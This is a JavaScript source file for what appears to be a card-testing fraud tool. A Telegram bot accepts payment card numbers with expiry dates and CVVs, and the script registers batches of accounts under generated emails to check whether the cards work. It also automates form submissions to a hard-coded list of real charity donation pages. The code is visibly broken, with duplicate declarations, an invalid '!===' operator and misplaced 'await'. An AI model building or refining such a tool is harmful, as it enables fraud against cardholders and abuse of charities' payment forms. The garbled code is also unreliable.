const config = require('./config');
const { TelegramBot } = require('./src/telegram/bot');
const { Utils, accpetedFormats } = require('./src/base/utils');
let _storedMails = require('./saved data/unusedemail.json');
let _usedMails = require('./saved data/usedemail.json');
const util = require('util');
const Logger = require('./src/base/Logger');
const { Utils, accpetedFormats } = require('./src/base/utils');
const utils = new Utils();
const { numberOfRegisterInOneTime, oneTimeMailGen, domains } = require('./config');
const puppeteer = require('puppeteer');
const fs = require('fs');
let telegramBot = null;
const _sleep = util.promisify(setTimeout);

async function startTool() {
    await importantTaskBeforeStart();
    await startTelegramBot();
};

startTool();

async function startTelegramBot() {
    const { TelegramBot } = require('./src/telegram/bot');
    telegramBot = new TelegramBot(config.telegramBotToken);
    Logger.debug('Starting Telegram bot ...');
    await telegramBot.start().catch((err) => {
        console.error(err);
    });
    Logger.debug('Telegram bot started successfully!');
};

/**
 * Generate a unique email address using a specified domain
 *
 * @param {string} domain - The domain to use for the email address
 * @returns {string} A unique email address
 */
function generateUniqueEmail(domain) {
    const possibleChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let email = `${utils.randomString(5)}@${domain}`;

    // Check if the generated email is already used
    if (_usedMails.includes(email)) {
        return generateUniqueEmail(domain);
    }

    // If the email is not used, add it to the list of unused emails
    _storedMails.push(email);
    fs.writeFileSync('./saved data/unusedemail.json', JSON.stringify(_storedMails));

    return email;
}

/**
 *
 * @param {string} cardDetails Cards Details in this format: "1234 5678 1234 5678 | 02 | 2023 | 123"
 */
async function executeOneOperationOk(cardDetails) {
    if (!cardDetails) return 'Please provide card details in any of these formats: ' + accpetedFormats.join(',\n');
if (typeof cardDetails !=== 'string') return 'Invalid card details provided! Please provide card
    details in any of these formats: ' + accpetedFormats.join(',\n');
    let firstCardDetails = "";
    try {
        firstCardDetails = utils.extractCardDetails(cardDetails);
        if (typeof firstCardDetails === 'string') {
            return firstCardDetails;
        }
    } catch (error) {
return `Invalid card details provided! Please provide card details in any of these formats:
    ${accpetedFormats.join(',\n')}`;
    }
    try {
        return await executeOneCCWholeProcess(firstCardDetails);
    } catch (error) {
        return `Error occurred while processing the card: ${firstCardDetails.toString()}`;
    }
}

/**
 *
 * @param {Object} cardDetails - Object of card details
 * @param {number} cardDetails.cardNumber - Card number
 * @param {number} cardDetails.expireMonth - Card expire month
 * @param {number} cardDetails.expireYear - Card expire year
 * @param {number} cardDetails.cvv - Card cvv
 */
async function executeOneCCWholeProcess(cardDetails) {
    let ok_result_main = null;
    try {
        for (let i = 0; i < (numberOfRegisterInOneTime - 1); i++) {
await registerUser(cardDetails,
    generateUniqueEmail(domains[utils.randomIntFromInterval(0, domains.length - 1)]));
        }
ok_result_main = await registerUser(cardDetails,
    generateUniqueEmail(domains[utils.randomIntFromInterval(0, domains.length - 1)]));
    } catch (err) {
        console.error(err);
        return `Error occurred while processing the card!`;
    } finally {
        return ok_result_main;
    }
}

async function generateEmail() {
    const name = `User${Math.floor(Math.random() * 100)}`;
    const domain = config.domains[Math.floor(Math.random() * config.domains.length)];
    const email = `${name}@${domain}`;
    return email;
}

async function sendEmailToTelegramBot(email) {
    if (!telegramBot) {
        console.error('Telegram bot is not initialized');
        return;
    }
    try {
        await telegramBot.sendMessage(`New email: ${email}`);
    } catch (err) {
        console.error('Error sending email to Telegram bot:', err);
    }
}

async function fillAndSubmitForm(website) {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.goto(website.url);

    const name = await page.$eval('#name', (input) => input.value = 'John Doe');
    const email = await page.$eval('#email', (input) => input.value = await generateEmail());
    const phone = await page.$eval('#phone', (input) => input.value = '1234567890');
    const address = await page.$eval('#address', (input) => input.value = '123 Main St');

    await page.click('#submit');

    await browser.close();
}

async function main() {
    const websites = [
        {
            url: 'https://getkinky.com/signup/verify',
            selectors: {
                name: '#name',
                email: '#email',
                phone: '#phone',
                address: '#address'
            }
        },
        {
            url: 'https://sodzointernational.org/donate/#form-error',
            selectors: {
                name: '#firstname',
                email: '#email',
                phone: '#phone',
                address: '#address'
            }
        },
        {
            url: 'https://futuremindsfoundation.org/donate-now/',
            selectors: {
                name: '#firstname',
                email: '#email',
                phone: '#phone',
                address: '#address'
            }
        },
        {
            url: 'https://rrimedia.org/Donate',
            selectors: {
                name: '#firstname',
                email: '#email',
                phone: '#phone',
                address: '#address'
            }
        },
        {
            url: 'https://www.nicwa.org/donate-online/',
            selectors: {
                name: '#firstname',
                email: '#email',
                phone: '#phone',
                address: '#address'
            }
        },
        {
            url: 'https://www.nationalcouncil.org/donate/',
            selectors: {
                name: '#firstname',
                email: '#email',
                phone: '#phone',
                address: '#address'
            }
        },
        {
            url: 'https://eyecareproject.com/one-time-donation/',
            selectors: {
                name: '#firstname',
                email: '#email',
                phone: '#phone',
                address: '#address'
            }
        }
    ];

    for (const website of websites) {
        await fillAndSubmitForm(website);
        await _sleep(5000);
        await sendEmailToTelegramBot(await generateEmail());
    }
}

main();